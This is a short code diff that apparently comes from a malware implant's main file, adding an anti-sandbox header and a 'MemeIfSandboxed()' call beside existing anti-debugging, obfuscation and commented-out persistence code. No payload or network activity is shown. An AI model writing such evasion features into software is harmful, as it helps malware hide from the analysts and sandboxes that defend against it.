@@ -22,6 +22,7 @@
 #include "handlers.h"
 #include "schtask.h"
 #include "antidebug.h"
+#include "antisandbox.h"
 
 using namespace std;
 using namespace andrivet::ADVobfuscator;
@@ -39,6 +40,7 @@ int main()
 	StartAntiDebugThread();
 
 	// Anti Sandbox
+	MemeIfSandboxed();
 
 	// Persistence
 	//string pSelfImplantPath(GetImplantPath());
